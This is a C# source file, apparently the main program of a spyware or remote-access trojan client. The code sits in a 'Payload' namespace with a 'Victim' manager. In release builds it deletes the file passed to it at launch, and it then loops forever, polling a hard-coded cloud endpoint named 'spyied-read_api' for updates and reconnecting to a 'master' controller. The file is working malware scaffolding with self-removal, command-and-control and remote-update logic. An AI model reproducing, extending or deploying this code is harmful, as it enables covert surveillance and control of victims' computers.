using System;
using System.IO;
using Payload.Codes;
using Payload.Victim;
using System.Threading;

namespace Payload
{
    class Program
    {
        private static string UpgradeURL = string.Empty;

        private static void Main(string[] PTHArgs)
        {
            AppDomain.CurrentDomain.UnhandledException += UnhandledException;

#if !DEBUG
            try
            {
                if (PTHArgs != null && PTHArgs.Length > 0)
                    if (File.Exists(PTHArgs[0])) File.Delete(PTHArgs[0]);                
            }
            catch { }
#endif

            VUtils.SWTracer.Start();
            Console.WriteLine("Initializing..");
            VUtils.Initialize(); LoopCheckForUpdates();
            while (true) { Thread.Sleep(60 * 60 * 1000); }
        }

        private static void UnhandledException(object _, UnhandledExceptionEventArgs UEEArgs)
        {
            Thread.Sleep(2 * 1000);
            File.AppendAllText("error.txt", ((Exception)UEEArgs.ExceptionObject).ToString() + Environment.NewLine + "|----==-===----=----===-==----|" + Environment.NewLine);
        }

        private static async void LoopCheckForUpdates()
        {
            Console.WriteLine("Checking For Updates...");

            while (true)
            {
                if (await VUtils.IsNetConnected())
                {
                    if (await IsUpdateAvailable())
                    {
                        // [To-Do]
                    }
                    else if (!VictimManager.IsMasterConnected)
                        VictimManager.LoopForConnection();

                    Thread.Sleep(10 * 60 * 1000);
                }
                else Thread.Sleep(30 * 1000);
            }
        }

        private static async System.Threading.Tasks.Task<bool> IsUpdateAvailable()
        {
            string UpData, UpReqURL = "https://acc32d92.eu-gb.apigw.appdomain.cloud/spyied-read_api/read";

            if (!string.IsNullOrWhiteSpace(UpData = await UpReqURL.GetAsync()))
            {
                var UPInf = Newtonsoft.Json.JsonConvert.DeserializeObject<UpdateInfo>(UpData);

                if (UPInf != null && UPInf.Version != VUtils.Version)
                {
                    Console.WriteLine($"Update Available: Targeting => v({UPInf.Version})");
                    UpgradeURL = UPInf.UpdateURL;
                    return true;
                }
            }

            return false;
        }
    }
}
